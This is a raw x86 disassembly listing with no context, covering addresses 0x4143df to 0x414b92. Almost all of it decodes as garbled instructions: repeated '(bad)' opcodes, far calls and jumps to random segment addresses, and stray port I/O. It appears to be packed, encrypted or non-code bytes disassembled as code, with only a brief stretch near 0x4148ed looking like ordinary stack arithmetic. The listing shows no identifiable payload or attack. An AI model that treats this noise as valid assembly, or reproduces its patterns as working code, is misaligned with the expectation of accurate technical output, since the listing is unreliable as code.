  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	test   bh,al
  4143e6:	pop    ss
  4143e7:	inc    esi
  4143e8:	ror    DWORD PTR [ecx],0x7f
  4143eb:	js     0x4143d2
  4143ed:	jle    0x414467
  4143ef:	js     0x4143a2
  4143f1:	in     eax,dx
  4143f2:	aaa    
  4143f3:	pop    edi
  4143f4:	and    eax,0x9c49b56d
  4143f9:	xlat   BYTE PTR ds:[ebx]
  4143fa:	cmp    BYTE PTR [esi+0x65ae3493],al
  414400:	mov    DWORD PTR [ebx-0x1f8f6b2e],ebx
  414406:	xchg   edx,eax
  414407:	xchg   esp,esi
  414409:	xor    DWORD PTR [ecx+0x3889ba42],esp
  41440f:	call   0x3c9a:0x95a48d76
  414416:	xchg   edi,eax
  414417:	pusha  
  414418:	or     DWORD PTR [ebx],esp
  41441a:	add    al,0xc5
  41441c:	push   esp
  41441d:	xchg   ecx,eax
  41441e:	nop
  41441f:	icebp  
  414420:	inc    edi
  414421:	in     eax,dx
  414422:	in     eax,0xf0
  414424:	daa    
  414425:	mov    ah,BYTE PTR [edi+edx*8+0x7a]
  414429:	xor    BYTE PTR [ecx-0x787d4e8c],0xb0
  414430:	and    al,0x15
  414432:	or     eax,0x8449000d
  414437:	mov    eax,0x7c1e3957
  41443c:	jmp    0xb19:0xdacdd3e4
  414443:	inc    ecx
  414444:	cwde   
  414445:	sar    DWORD PTR [edi-0x4bf927d2],cl
  41444b:	loop   0x4143eb
  41444d:	push   esi
  41444e:	stc    
  41444f:	(bad)  
  414450:	cmp    esi,DWORD PTR [ebx-0x657a2dc4]
  414456:	scas   al,BYTE PTR es:[edi]
  414457:	dec    ebp
  414458:	mov    cs,WORD PTR [ebp+0xe]
  41445b:	and    bl,ch
  41445d:	div    BYTE PTR [esp+0xe867829]
  414464:	sub    BYTE PTR [ebx+0x17],dl
  414467:	lock push edx
  414469:	pushf  
  41446a:	pop    ebx
  41446b:	xor    DWORD PTR [eax+0x1b],ecx
  41446e:	add    ebx,esi
  414470:	mov    ss,esp
  414472:	inc    esp
  414473:	ret    
  414474:	xchg   edx,eax
  414475:	mov    al,ds:0x970fa3d5
  41447a:	lds    edx,FWORD PTR [edx]
  41447c:	or     BYTE PTR cs:[eax-0x1d243b31],ah
  414483:	xor    edi,DWORD PTR [ebp+0x370eee7]
  414489:	adc    edx,DWORD PTR [edi+0x74]
  41448c:	xchg   DWORD PTR gs:[edx-0x11],esi
  414490:	out    0x10,al
  414492:	push   ebx
  414493:	(bad)  
  414494:	inc    DWORD PTR [ebp*2-0x113b5169]
  41449b:	cmp    esi,DWORD PTR [esi]
  41449d:	in     eax,0x70
  41449f:	jb     0x4144f7
  4144a1:	and    edi,DWORD PTR [ebx+0xe]
  4144a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144a5:	pop    es
  4144a6:	retf   
  4144a7:	mov    ah,0x6c
  4144a9:	sub    edx,DWORD PTR [eax+esi*2-0x4b7c8826]
  4144b0:	pop    ebp
  4144b1:	popf   
  4144b2:	and    BYTE PTR [ebx+edi*1],0x40
  4144b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144b7:	inc    esp
  4144b8:	call   0x37ee:0xefa3a18
  4144bf:	push   ebx
  4144c0:	ret    
  4144c1:	inc    edi
  4144c2:	in     al,0x66
  4144c4:	imul   eax,DWORD PTR [eax-0x54],0xffffffcd
  4144c8:	mov    al,ds:0xc9acb0a7
  4144cd:	sti    
  4144ce:	jmp    0xf752:0x5d86b975
  4144d5:	inc    eax
  4144d6:	mov    dh,0x7a
  4144d8:	jg     0x414481
  4144da:	(bad)  
  4144db:	cmc    
  4144dc:	xchg   ebp,eax
  4144dd:	inc    edi
  4144de:	fild   WORD PTR [edx+0x430e40e]
  4144e4:	aad    0x71
  4144e6:	adc    cl,BYTE PTR [ebp+edi*8-0x6f80352a]
  4144ed:	or     BYTE PTR [ecx-0x3d],bh
  4144f0:	popf   
  4144f1:	mov    dl,0x9a
  4144f3:	mov    BYTE PTR [edi+0x1d],dl
  4144f6:	xor    cl,ch
  4144f8:	pushf  
  4144f9:	das    
  4144fa:	jbe    0xb0d66637
  414500:	adc    eax,0xce58873d
  414505:	out    0x19,eax
  414507:	bound  ebp,QWORD PTR [edi+0x5ca674ab]
  41450d:	je     0x4144fd
  41450f:	mov    ds:0xcf60a08f,al
  414514:	sbb    eax,0xdf16e60f
  414519:	outs   dx,BYTE PTR ds:[esi]
  41451a:	cdq    
  41451b:	sbb    BYTE PTR [esi],al
  41451d:	pop    ss
  41451e:	mov    eax,DWORD PTR [eax]
  414520:	xor    BYTE PTR [esi],0x63
  414523:	inc    edx
  414524:	into   
  414525:	cmp    cl,al
  414527:	cmp    al,0xe2
  414529:	and    DWORD PTR [ecx],ecx
  41452b:	les    ebx,FWORD PTR [esi-0x2e]
  41452e:	sbb    DWORD PTR [ecx-0xdfd29d1],eax
  414534:	fnstcw WORD PTR [ebp-0x49]
  414537:	popf   
  414538:	and    bh,dh
  41453a:	arpl   WORD PTR [esi-0x29],ax
  41453d:	push   es
  41453e:	int    0x78
  414540:	pusha  
  414541:	add    eax,ebp
  414543:	cmp    eax,0x5638e1a9
  414548:	sbb    eax,0xf10b5828
  41454d:	cld    
  41454e:	mov    bl,0x97
  414550:	or     DWORD PTR [ebp-0x4c841854],ebx
  414556:	int3   
  414557:	dec    ecx
  414558:	addr16 in al,dx
  41455a:	nop
  41455b:	sub    edx,DWORD PTR [ebx]
  41455d:	pop    es
  41455e:	pop    esp
  41455f:	push   0x4278cf20
  414564:	mov    dh,BYTE PTR [edx+0x26]
  414567:	sbb    bh,BYTE PTR [ecx-0x347722ee]
  41456d:	mov    al,ds:0x367170b
  414572:	ins    BYTE PTR es:[edi],dx
  414573:	call   DWORD PTR [edx+0x744974dd]
  414579:	repz mov ebx,0x9088fa32
  41457f:	xor    DWORD PTR [eax],edx
  414581:	dec    edi
  414582:	add    al,0x90
  414584:	push   cs
  414585:	jbe    0x41453b
  414587:	xor    eax,0x8850d91c
  41458c:	or     al,0x7d
  41458e:	popf   
  41458f:	inc    edi
  414590:	dec    ecx
  414591:	lods   eax,DWORD PTR ds:[esi]
  414592:	sub    ah,dl
  414594:	inc    edx
  414595:	imul   ebx,ebp,0x3851bc94
  41459b:	retf   0xbabc
  41459e:	ret    0xe458
  4145a1:	ror    BYTE PTR [ecx-0xd],0xeb
  4145a5:	sbb    bh,BYTE PTR [ebp-0x2d]
  4145a8:	scas   al,BYTE PTR es:[edi]
  4145a9:	push   eax
  4145aa:	pop    ecx
  4145ab:	pop    ecx
  4145ac:	add    al,0x63
  4145ae:	jge    0x4145c6
  4145b0:	fsubr  st,st(7)
  4145b2:	(bad)  
  4145b5:	ret    
  4145b6:	or     bl,BYTE PTR [ebx]
  4145b8:	xor    DWORD PTR [edx-0x14666e16],0xc80050c6
  4145c2:	mov    ebp,DWORD PTR [eax+0x61f098e2]
  4145c8:	aam    0x73
  4145ca:	xchg   esi,eax
  4145cb:	xchg   edi,eax
  4145cc:	fstp   QWORD PTR [edx+0x67cfee0e]
  4145d2:	dec    edi
  4145d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145d4:	ja     0x41456d
  4145d6:	dec    edi
  4145d7:	dec    ecx
  4145d8:	inc    ebp
  4145d9:	jp     0x414571
  4145db:	sbb    eax,0xd7bf4a20
  4145e0:	xor    ecx,DWORD PTR [ebx]
  4145e2:	pop    eax
  4145e3:	cmp    eax,0x9000250e
  4145e8:	add    al,0x5f
  4145ea:	sbb    DWORD PTR [ecx-0x42678f6c],esp
  4145f0:	leave  
  4145f1:	cmp    bl,ch
  4145f3:	inc    ecx
  4145f4:	xlat   BYTE PTR ds:[ebx]
  4145f5:	fst    QWORD PTR [edi+0x4f9ba59a]
  4145fb:	(bad)  
  4145fc:	lock or ebp,DWORD PTR [esi-0x54448cb7]
  414603:	scas   al,BYTE PTR es:[edi]
  414604:	shl    DWORD PTR [esp+edi*2-0x344dfdd6],1
  41460b:	push   ecx
  41460c:	pop    edx
  41460d:	pop    ebp
  41460e:	jb     0x41468d
  414610:	mov    al,ds:0xe44e43eb
  414615:	cmp    bl,BYTE PTR [eax+0x6108bbb1]
  41461b:	jmp    0xd0f1:0x8960b22d
  414622:	add    BYTE PTR [edi-0x51],dl
  414625:	leave  
  414626:	pop    esp
  414627:	inc    esi
  414628:	ss retf 0x499b
  41462c:	mov    WORD PTR [edi],?
  41462e:	xchg   ecx,eax
  41462f:	sbb    al,0x9e
  414631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414632:	addr16 push ebp
  414634:	jns    0x41463e
  414636:	xlat   BYTE PTR ds:[ebx]
  414637:	add    DWORD PTR [ebx+0x19],edx
  41463a:	in     al,0x18
  41463c:	pop    esp
  41463d:	mov    DWORD PTR [ebp-0x574deee9],ebp
  414643:	pop    ds
  414644:	jbe    0x4146bc
  414646:	jno    0x4146a9
  414648:	(bad)  
  41464a:	(bad)  
  41464b:	gs dec esp
  41464d:	inc    ebp
  41464e:	or     al,0x41
  414650:	mov    eax,0xce63a38c
  414655:	cwde   
  414656:	gs gs xchg ecx,eax
  414659:	out    dx,al
  41465a:	cmc    
  41465b:	imul   edx,edi
  41465e:	mov    edi,DWORD PTR [ebp-0x18]
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	adc    BYTE PTR [eax],0xe
  414674:	call   0xe578:0x7f0fae2e
  41467b:	jle    0x4146f5
  41467d:	js     0x4146d3
  41467f:	add    bh,BYTE PTR [edx]
  414681:	or     eax,ecx
  414683:	or     al,0xc2
  414685:	mov    cl,0xbd
  414687:	aam    0x57
  414689:	cmp    al,ch
  41468b:	add    al,0xa2
  41468d:	jae    0x4146aa
  41468f:	or     eax,0x5ca68742
  414694:	mov    edi,0xce761eb8
  414699:	lods   eax,DWORD PTR ds:[esi]
  41469a:	loopne 0x4146ba
  41469c:	gs jbe 0x414661
  41469f:	repnz sub ch,BYTE PTR fs:[ebp+0x1e]
  4146a4:	out    0xe4,eax
  4146a6:	jb     0x4146a3
  4146a8:	xor    eax,0x296ce4e3
  4146ad:	addr16 std 
  4146af:	repnz stos BYTE PTR es:[edi],al
  4146b1:	mov    dl,0xfa
  4146b3:	adc    eax,0xac9dba6f
  4146b8:	gs stos BYTE PTR es:[edi],al
  4146ba:	and    al,0x4e
  4146bc:	pop    ecx
  4146bd:	sub    ecx,DWORD PTR [ecx+ebx*8+0x3f]
  4146c1:	dec    edx
  4146c2:	mov    esi,0xeed2e9a5
  4146c7:	jmp    0xf5d54523
  4146cc:	int    0xbb
  4146ce:	jg     0x414717
  4146d0:	xor    esp,DWORD PTR [edi+0x29]
  4146d3:	sub    DWORD PTR ds:0x244355b1,esi
  4146d9:	repnz adc DWORD PTR [edi+eiz*1-0x219aa088],ebx
  4146e1:	lahf   
  4146e2:	push   ds
  4146e3:	repz test DWORD PTR es:[ebp-0x4074c989],esi
  4146eb:	cmp    DWORD PTR [ecx],0xffffffdc
  4146ee:	push   ebp
  4146ef:	xchg   ecx,eax
  4146f0:	fist   DWORD PTR [ecx]
  4146f2:	jns    0x4146e9
  4146f4:	lds    edx,FWORD PTR [eax]
  4146f6:	inc    edx
  4146f7:	out    0x4,al
  4146f9:	ins    BYTE PTR es:[edi],dx
  4146fa:	xor    esi,DWORD PTR [esi-0x748a4fe9]
  414700:	scas   eax,DWORD PTR es:[edi]
  414701:	popf   
  414702:	popf   
  414703:	jp     0x4146d8
  414705:	ins    BYTE PTR es:[edi],dx
  414706:	jnp    0x4146e5
  414708:	pusha  
  414709:	or     ebx,DWORD PTR [edi+0x3b]
  41470c:	pop    edx
  41470d:	xchg   ebp,eax
  41470e:	in     eax,0xf6
  414710:	popf   
  414711:	jle    0x4146e8
  414713:	mov    ah,0x29
  414715:	xchg   esi,eax
  414716:	loop   0x4146b2
  414718:	out    dx,eax
  414719:	push   ds
  41471a:	(bad)  
  41471b:	jmp    0x6c37:0xe21faa48
  414722:	ret    0x49ae
  414725:	pop    ss
  414726:	xchg   BYTE PTR [eax-0x5ae504cd],cl
  41472c:	std    
  41472d:	stos   BYTE PTR es:[edi],al
  41472e:	test   eax,0xc902a6b1
  414733:	xor    eax,0xc16f17
  414738:	pop    ebx
  414739:	inc    edx
  41473a:	xchg   esp,eax
  41473b:	push   edi
  41473c:	inc    ecx
  41473d:	jmp    0x414753
  41473f:	pop    esp
  414740:	jmp    FWORD PTR [ebx]
  414742:	js     0x4146fb
  414744:	ins    BYTE PTR es:[edi],dx
  414745:	das    
  414746:	mov    ebx,0x15f09635
  41474b:	sub    eax,edi
  41474d:	dec    esp
  41474e:	ds adc al,0x51
  414751:	call   0xd1d5:0xca8c25b0
  414758:	sti    
  414759:	mov    eax,ds:0x383f59f5
  41475e:	(bad)  
  41475f:	mov    dh,0xba
  414761:	cmp    DWORD PTR [esi+0x7f],ebx
  414764:	dec    edx
  414765:	mov    ch,0xc6
  414767:	stos   DWORD PTR es:[edi],eax
  414768:	fistp  DWORD PTR [ecx-0x73e11b1c]
  41476e:	jg     0x41472f
  414770:	scas   eax,DWORD PTR es:[edi]
  414771:	dec    esi
  414772:	jle    0x414728
  414774:	(bad)  
  414775:	jl     0x41471a
  414777:	or     al,BYTE PTR [eax-0x2ffb31f3]
  41477d:	mov    eax,0x4230b929
  414782:	or     bl,cl
  414784:	out    0x32,eax
  414786:	pusha  
  414787:	mov    ecx,0x459118bb
  41478c:	shr    bh,1
  41478e:	addr16 inc ecx
  414790:	xor    eax,0xd7f58da7
  414795:	lods   al,BYTE PTR ds:[esi]
  414796:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414798:	fistp  WORD PTR [esp+edx*4+0x6f]
  41479c:	mov    ds:0x6679ee9b,al
  4147a1:	shl    BYTE PTR [eax+0x5],1
  4147a4:	push   ebp
  4147a5:	sbb    eax,0x86cae273
  4147aa:	or     eax,0x71602d89
  4147af:	aad    0xf1
  4147b1:	cmp    BYTE PTR [esi+0x4e],0x64
  4147b5:	jge    0x4147f8
  4147b7:	add    edx,DWORD PTR [eax+0x525b2bc1]
  4147bd:	mov    ds:0x49384f18,eax
  4147c2:	leave  
  4147c3:	dec    eax
  4147c4:	xor    DWORD PTR [ebx+0x57e270eb],esi
  4147ca:	sbb    al,0xa7
  4147cc:	aad    0x3f
  4147ce:	sub    al,ah
  4147d0:	mov    esi,0xa604d682
  4147d5:	ret    0xf174
  4147d8:	pop    ds
  4147d9:	xor    al,bh
  4147db:	out    0x73,eax
  4147dd:	mov    dl,0x5f
  4147df:	push   edx
  4147e0:	mov    DWORD PTR [eax+ebx*8-0x54c89ed1],ecx
  4147e7:	jecxz  0x414861
  4147e9:	(bad)  [ebx-0x42839355]
  4147ef:	lahf   
  4147f0:	es jae 0x4147bc
  4147f3:	cmp    edi,DWORD PTR [ebp-0x4ac895ed]
  4147f9:	(bad)  
  4147fa:	call   0x410136b3
  4147ff:	sbb    al,0xcb
  414801:	jbe    0x4147e2
  414803:	ins    BYTE PTR es:[edi],dx
  414804:	pop    ecx
  414805:	cmp    DWORD PTR [ecx+0x2d],ecx
  414808:	out    dx,al
  414809:	lea    ebp,fs:[esi]
  41480c:	jb     0x414798
  41480e:	adc    BYTE PTR [edx+0x12a72c1b],cl
  414814:	leave  
  414815:	or     bl,BYTE PTR [esi]
  414817:	loop   0x414892
  414819:	dec    ecx
  41481a:	pop    ecx
  41481b:	shr    DWORD PTR [edx],cl
  41481d:	xor    esi,DWORD PTR [edi+0xff7d6f4]
  414823:	fidiv  DWORD PTR [eax+0x13]
  414826:	fiadd  DWORD PTR [eax]
  414828:	test   eax,0xb8b9dc71
  41482d:	test   eax,0xba919694
  414832:	push   ebp
  414833:	jge    0x414892
  414835:	inc    esi
  414836:	rcl    DWORD PTR [edx+0x6da98e3b],cl
  41483c:	push   0x7437cf4d
  414841:	sbb    dh,dh
  414843:	mov    dl,0x27
  414845:	push   esi
  414846:	pushf  
  414847:	add    DWORD PTR [edi+0x336d2aa3],esp
  41484d:	and    eax,0x8c60456
  414852:	pop    edx
  414853:	mov    ebp,0xcf2b72b7
  414858:	stos   DWORD PTR es:[edi],eax
  414859:	je     0x414875
  41485b:	out    dx,eax
  41485c:	mov    cl,dl
  41485e:	outs   dx,BYTE PTR ds:[esi]
  41485f:	push   ss
  414860:	jmp    0xa3e4:0x58b6e277
  414867:	pop    ds
  414868:	jne    0x414810
  41486a:	xor    eax,0xe767b6f3
  41486f:	dec    eax
  414870:	and    al,0xf2
  414872:	ins    BYTE PTR es:[edi],dx
  414873:	sbb    eax,0xae01e995
  414878:	in     eax,dx
  414879:	jae    0x41487f
  41487b:	xchg   ecx,eax
  41487c:	jecxz  0x41480f
  41487e:	jne    0x4148fb
  414880:	je     0x4148c5
  414882:	(bad)  
  414883:	pop    ecx
  414884:	ins    BYTE PTR es:[edi],dx
  414885:	sbb    bl,BYTE PTR [ecx-0x1670b4d]
  41488b:	mov    edx,0x2b304a8b
  414890:	inc    eax
  414891:	repz mov ecx,0x8a059d59
  414897:	mov    ch,0xf4
  414899:	add    ah,BYTE PTR [edi]
  41489b:	call   0xd036:0xe2810735
  4148a2:	fistp  QWORD PTR [edi-0x1a648fb7]
  4148a8:	imul   edi,DWORD PTR ds:0x243174c2,0x4
  4148af:	arpl   WORD PTR [ecx],di
  4148b1:	mov    eax,ds:0x775e3eaf
  4148b6:	loopne 0x414881
  4148b8:	ins    BYTE PTR es:[edi],dx
  4148b9:	imul   esp,DWORD PTR [esi],0xe3a4ad7c
  4148bf:	les    edi,FWORD PTR [eax-0x66af3b78]
  4148c5:	and    edi,DWORD PTR [ebx+0x4b]
  4148c8:	cmp    al,BYTE PTR [eax+0x110a7e3d]
  4148ce:	dec    eax
  4148cf:	test   al,0xc
  4148d1:	jo     0x41492b
  4148d3:	push   0x46
  4148d5:	mov    al,ds:0xc47cc9eb
  4148da:	les    ebp,FWORD PTR [edi+0x1e379821]
  4148e0:	adc    eax,0xd4b5805f
  4148e5:	fwait
  4148e6:	sbb    edx,esp
  4148e8:	sbb    esi,DWORD PTR [ebx]
  4148ea:	clc    
  4148eb:	add    edx,edi
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax+0x4527854b]
  414921:	or     ah,0xbe
  414924:	sbb    ecx,DWORD PTR [edi+edi*2]
  414927:	js     0x41490e
  414929:	jle    0x4149a3
  41492b:	js     0x4149a0
  41492d:	scas   eax,DWORD PTR es:[edi]
  41492e:	ss mov dl,bh
  414931:	xchg   esi,eax
  414932:	dec    edi
  414933:	mov    bl,dh
  414935:	ror    DWORD PTR [edx+ecx*8],1
  414938:	cmp    al,0x8d
  41493b:	mov    edx,0xb8f814ec
  414940:	and    bh,dh
  414942:	dec    ebx
  414943:	in     eax,0x1f
  414945:	adc    eax,0xbc8098e7
  41494a:	xor    al,0xf2
  41494c:	scas   eax,DWORD PTR es:[edi]
  41494d:	aad    0x22
  41494f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414950:	add    BYTE PTR [esi-0x6c],dh
  414953:	ins    BYTE PTR es:[edi],dx
  414954:	xlat   BYTE PTR ds:[ebx]
  414955:	mov    dl,0x3c
  414957:	mov    ah,BYTE PTR [ecx]
  414959:	mov    WORD PTR [ebp-0x1d],fs
  41495c:	les    ebp,FWORD PTR [ebp+0x19]
  41495f:	dec    ecx
  414960:	ret    0xd69a
  414963:	std    
  414964:	(bad)  
  414965:	out    dx,al
  414966:	pop    esi
  414967:	ins    DWORD PTR es:[edi],dx
  414968:	mov    eax,ds:0xf2412ff1
  41496d:	idiv   ebp
  41496f:	mul    DWORD PTR [eax]
  414971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414972:	xchg   ecx,eax
  414973:	jl     0x4149cb
  414975:	add    bl,BYTE PTR [edx-0x79e60a87]
  41497b:	hlt    
  41497c:	aam    0x8
  41497e:	jns    0x414988
  414980:	mov    ch,0xf6
  414982:	test   al,0x2f
  414984:	gs pop ds
  414986:	pop    ds
  414987:	imul   edi,DWORD PTR [esi+eiz*8],0x4bd8980d
  41498e:	(bad)  [edx+0x2a]
  414991:	scas   al,BYTE PTR es:[edi]
  414992:	xor    BYTE PTR fs:[edi],ch
  414995:	sbb    DWORD PTR [esi+ebx*2-0x6d],ebx
  414999:	jg     0x4149f3
  41499b:	fnstcw WORD PTR [ecx]
  41499d:	call   0xa4cc:0x84f887dc
  4149a4:	nop
  4149a5:	xchg   esi,eax
  4149a6:	rcr    BYTE PTR [ecx],0x27
  4149a9:	out    dx,al
  4149aa:	adc    BYTE PTR [esi-0x15],0x4e
  4149ae:	cmp    cl,BYTE PTR [ecx+0x3c]
  4149b1:	mov    eax,ds:0xb631e24d
  4149b6:	xor    bl,0x8b
  4149b9:	or     DWORD PTR [edi+0x1ca4348e],esp
  4149bf:	das    
  4149c0:	popa   
  4149c1:	add    eax,0x1ad9de70
  4149c6:	ja     0x4149b7
  4149c8:	sbb    al,0xda
  4149ca:	inc    edi
  4149cb:	loopne 0x4149f8
  4149cd:	cmp    DWORD PTR [edi+0x2f],edx
  4149d0:	jo     0x414a05
  4149d2:	clc    
  4149d3:	lds    edx,FWORD PTR [ebx]
  4149d5:	sub    DWORD PTR [esi-0x8dbb24],ebp
  4149db:	(bad)  
  4149dc:	mov    ebp,0x6fcae5a7
  4149e1:	ret    0x3abd
  4149e4:	cdq    
  4149e5:	scas   eax,DWORD PTR es:[edi]
  4149e6:	cs push es
  4149e8:	mov    al,0x41
  4149ea:	or     DWORD PTR [edx-0x641bed37],esi
  4149f0:	xor    eax,0x95990edc
  4149f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149f6:	sbb    BYTE PTR [esi+0x7828a1ba],0x9a
  4149fd:	push   ebx
  4149fe:	and    eax,eax
  414a00:	mov    BYTE PTR [eax-0x13],dl
  414a03:	ss xchg ebx,eax
  414a05:	stc    
  414a06:	out    0xac,eax
  414a08:	and    eax,DWORD PTR [eax-0x6d1bb390]
  414a0e:	(bad)  
  414a0f:	jmp    0x61b9:0xa2e7a11b
  414a16:	push   ecx
  414a17:	mov    eax,ds:0x3e6d0d2f
  414a1c:	and    DWORD PTR [eax+0x2d],esp
  414a1f:	add    eax,0x37844d3b
  414a24:	nop
  414a25:	mov    bl,0x97
  414a27:	push   0x27
  414a29:	xor    DWORD PTR [edi+eiz*2-0x31],ecx
  414a2d:	ds sysenter 
  414a30:	xchg   ecx,eax
  414a31:	stos   BYTE PTR es:[edi],al
  414a32:	jo     0x414a79
  414a34:	jg     0x414a16
  414a36:	mov    BYTE PTR [ebp+0x5ebde465],0x4e
  414a3d:	das    
  414a3e:	inc    esi
  414a3f:	jge    0x4149c9
  414a41:	lods   al,BYTE PTR ds:[esi]
  414a42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a43:	imul   ebp,DWORD PTR [eax+esi*8-0x4b9c70cb],0xffffffff
  414a4b:	popa   
  414a4c:	jl     0x414a64
  414a4e:	outs   dx,BYTE PTR ds:[esi]
  414a4f:	std    
  414a50:	scas   eax,DWORD PTR es:[edi]
  414a51:	mov    bh,0x87
  414a53:	pop    ebp
  414a54:	stc    
  414a55:	clc    
  414a56:	ins    DWORD PTR es:[edi],dx
  414a57:	cdq    
  414a58:	mov    cl,0xec
  414a5a:	lock pop edi
  414a5c:	sbb    edi,ebx
  414a5e:	in     al,dx
  414a5f:	leave  
  414a60:	pop    eax
  414a61:	dec    ebx
  414a62:	div    BYTE PTR [ecx]
  414a64:	adc    dl,bh
  414a66:	dec    edi
  414a67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a68:	and    DWORD PTR [ecx-0x43a255fe],esp
  414a6e:	pop    edx
  414a6f:	(bad)  
  414a70:	rcr    DWORD PTR [ebx],cl
  414a72:	jae    0x414a26
  414a74:	cli    
  414a75:	and    ebp,edi
  414a77:	(bad)  
  414a78:	hlt    
  414a79:	mul    BYTE PTR [edi]
  414a7b:	hlt    
  414a7c:	sub    ah,BYTE PTR [ecx+0x41]
  414a7f:	pusha  
  414a80:	clc    
  414a81:	call   DWORD PTR [esi]
  414a83:	lods   al,BYTE PTR ds:[esi]
  414a84:	(bad)  
  414a85:	in     eax,dx
  414a86:	cwde   
  414a87:	push   ecx
  414a88:	xchg   ebp,eax
  414a89:	sbb    eax,DWORD PTR [ecx]
  414a8b:	mov    al,0x87
  414a8d:	ins    BYTE PTR es:[edi],dx
  414a8e:	cwde   
  414a8f:	sbb    al,0x7
  414a91:	dec    eax
  414a92:	jns    0x414aee
  414a94:	leave  
  414a95:	ja     0x414af0
  414a97:	dec    edx
  414a98:	sahf   
  414a99:	jmp    0x414ab2
  414a9b:	adc    DWORD PTR [ebp-0x19],ecx
  414a9e:	sahf   
  414a9f:	in     eax,0x94
  414aa1:	push   edi
  414aa2:	fadd   QWORD PTR [esi-0x237445fc]
  414aa8:	adc    edi,edi
  414aaa:	nop
  414aab:	std    
  414aac:	inc    ebx
  414aad:	mov    bh,0x0
  414aaf:	inc    ebx
  414ab0:	ins    DWORD PTR es:[edi],dx
  414ab1:	outs   dx,DWORD PTR ds:[esi]
  414ab2:	push   esp
  414ab3:	(bad)  
  414ab4:	pop    ebp
  414ab5:	mov    DWORD PTR [ebp-0x2fefcaf7],esp
  414abb:	sbb    eax,0xecbd2eb5
  414ac0:	fistp  QWORD PTR [esi+0x527590f3]
  414ac6:	xlat   BYTE PTR ds:[ebx]
  414ac7:	stc    
  414ac8:	dec    eax
  414ac9:	aam    0xcb
  414acb:	xchg   esp,eax
  414acc:	fs pop esi
  414ace:	and    eax,0xb72560f6
  414ad3:	sub    DWORD PTR [esi+0x1e2e1771],ecx
  414ad9:	ja     0x414b27
  414adb:	mul    BYTE PTR [edx+ebp*4+0x3c4b0a0a]
  414ae2:	adc    edi,DWORD PTR [esi]
  414ae4:	lock pop ebp
  414ae6:	jg     0x414b32
  414ae8:	ret    
  414ae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aea:	dec    esp
  414aeb:	pop    ebp
  414aec:	aam    0x43
  414aee:	aaa    
  414aef:	mov    dl,BYTE PTR [eax+0x23]
  414af2:	retf   
  414af3:	outs   dx,DWORD PTR ds:[esi]
  414af4:	push   0x50f2505c
  414af9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414afa:	sub    ecx,ecx
  414afc:	dec    esp
  414afd:	aaa    
  414afe:	xchg   ebx,eax
  414aff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b00:	dec    edx
  414b01:	and    al,0x8b
  414b03:	mov    ebx,DWORD PTR [edi-0x2101dd43]
  414b09:	fs sub dh,bl
  414b0c:	sbb    DWORD PTR [esi],ebp
  414b0e:	adc    esp,DWORD PTR [ebx-0x7455ec67]
  414b14:	test   eax,0x6eb3c237
  414b19:	push   edi
  414b1a:	stc    
  414b1b:	in     eax,dx
  414b1c:	aas    
  414b1d:	fmulp  st(1),st
  414b1f:	sub    eax,0x27b515f0
  414b24:	dec    esi
  414b25:	mov    al,0x49
  414b27:	ficomp WORD PTR [ebx+0x3ed073f1]
  414b2d:	xlat   BYTE PTR ds:[ebx]
  414b2e:	test   BYTE PTR [ebp-0x61],ah
  414b31:	cli    
  414b32:	test   eax,0xec536d4f
  414b37:	ins    DWORD PTR es:[edi],dx
  414b38:	pop    esi
  414b39:	ins    BYTE PTR es:[edi],dx
  414b3a:	(bad)  
  414b3b:	cwde   
  414b3c:	mov    ch,BYTE PTR [ebx+edi*1+0x6d]
  414b40:	adc    dl,ch
  414b42:	and    al,0xbf
  414b44:	push   ebx
  414b45:	mov    edi,0x4f14824c
  414b4a:	fisubr DWORD PTR [ecx+0x3be2b3fc]
  414b50:	in     eax,0x90
  414b52:	jecxz  0x414b19
  414b54:	and    eax,DWORD PTR [edi+0x5a5c01fe]
  414b5a:	xor    bl,ah
  414b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b5d:	jge    0x414bca
  414b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b60:	call   FWORD PTR [esi-0x71]
  414b63:	sbb    eax,eax
  414b65:	sub    DWORD PTR [edx+edi*4-0x22dc96df],eax
  414b6c:	mov    al,ds:0x4c4fe607
  414b71:	lods   al,BYTE PTR ds:[esi]
  414b72:	(bad)  
  414b73:	jp     0x414b91
  414b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b76:	adc    DWORD PTR [ecx-0x24],esi
  414b79:	das    
  414b7a:	idiv   BYTE PTR [eax+0x7851b3c9]
  414b80:	icebp  
  414b81:	rol    BYTE PTR [ebp+0x18],1
  414b84:	mov    al,ds:0x525a389c
  414b89:	xchg   esp,eax
  414b8a:	sti    
  414b8b:	aad    0xe5
  414b8d:	xchg   ebx,eax
  414b8e:	mov    dl,0x9f
  414b90:	aam    0x34
  414b92:	or     DWORD PTR [ebp+0x1],esp
